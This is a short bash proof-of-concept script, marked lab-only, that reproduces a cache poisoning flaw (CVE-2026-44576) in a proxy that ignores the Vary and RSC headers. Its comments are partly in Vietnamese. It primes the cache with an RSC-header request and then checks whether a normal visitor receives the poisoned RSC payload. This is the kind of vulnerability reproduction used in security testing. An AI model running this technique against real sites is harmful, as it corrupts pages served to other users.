#!/usr/bin/env bash
# LAB ONLY - CVE-2026-44576 (RSC cache poisoning).
#
# study-proxy.js keys its shared cache by path+query only, and does not honor
# Vary/RSC headers. Prime the URL with an RSC request, then request the same URL
# as a normal browser: the HTML visitor receives the cached RSC payload.
set -u
FE="${FE_BASE_URL:-http://127.0.0.1:3000}"
Q="?lab44576=$(date +%s)"

echo "== 1. Prime cache bằng RSC request =="
curl -s -H 'RSC: 1' -o /tmp/lab44576-rsc -w "status=%{http_code} type=%{content_type} size=%{size_download}\n" "$FE/products$Q"
echo "--- 80 ký tự đầu ---"; head -c 80 /tmp/lab44576-rsc; echo

echo
echo "== 2. Visitor thường request cùng URL =="
curl -s -o /tmp/lab44576-html -w "status=%{http_code} type=%{content_type} size=%{size_download}\n" "$FE/products$Q"
echo "--- 80 ký tự đầu ---"; head -c 80 /tmp/lab44576-html; echo

echo
if grep -qi '<!DOCTYPE html' /tmp/lab44576-html; then
  echo "KẾT QUẢ: visitor vẫn nhận HTML (cache chưa bị đầu độc hoặc đã có entry HTML trước đó)."
else
  echo "KẾT QUẢ: visitor nhận RSC payload thay vì HTML -> cache poisoning thành công."
fi
